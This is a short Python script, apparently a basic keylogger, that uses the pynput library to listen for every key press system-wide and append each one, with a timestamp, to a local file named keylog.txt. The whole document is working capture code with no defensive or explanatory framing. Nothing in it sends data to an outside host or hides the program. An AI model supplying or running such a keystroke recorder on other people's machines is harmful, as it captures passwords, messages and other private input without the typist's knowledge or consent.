from pynput import keyboard
import datetime

# File to store the logs
log_file = "keylog.txt"

def on_press(key):
    try:
        # Regular character keys
        with open(log_file, "a") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {key.char}\n")
    except AttributeError:
        # Special keys (enter, shift, etc.)
        with open(log_file, "a") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {key}\n")

# Set up the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()